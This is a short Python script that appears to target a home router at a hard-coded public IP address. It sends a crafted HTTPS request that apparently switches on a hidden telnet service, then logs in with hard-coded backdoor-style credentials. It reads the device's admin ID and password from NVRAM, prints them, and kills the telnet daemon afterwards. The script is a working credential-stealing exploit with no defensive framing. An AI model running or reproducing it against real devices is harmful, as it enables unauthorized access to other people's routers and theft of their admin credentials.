import requests
import getpass
import telnetlib
import parse

HOST = '211.201.135.97'
PORT = '2333'
user = 'e800admin'
passwd = 'e800!kisan2019!'

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
#requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':DES-CBC3-SHA'
#r = requests.get("https://211.201.135.97:5010/?zuwufkxpfspt=2333", verify=False)
r = requests.get(f"https://{HOST}:5010/?zuwufkxpfspt={PORT}", verify=False)
#print(r.status)

tn = telnetlib.Telnet(HOST, port=PORT)

response = tn.read_until(b"login:")
#print (response)
tn.write(user.encode('ascii') + b"\n")

tn.read_until(b"Password:")
tn.write(passwd.encode('ascii') + b"\n")

tn.write(b"knvram -a |grep system/admin\n")
tn.write(b"uptime\n")

tn.write(b"killall telnetd\n")

tn.write(b"exit\n")
response = tn.read_all()
#print(response)

token = str(response).split('\\r\\n')
#print (token)

for i in range(len(token)):
    res = parse.parse("system/adminid={}", token[i])
    if (res):
        print("adminid:" + res[0])
    
    res = parse.parse("system/adminpw={}", token[i])
    if (res):
        print("adminpw:" + res[0])
    
    res = parse.parse("{} up {} load average: {}", token[i])
    if (res):
        print("up:" + res[1])




#tn.write(b"exit\n")
#print (response)
#print(tn.read_all().decode("ascii"))
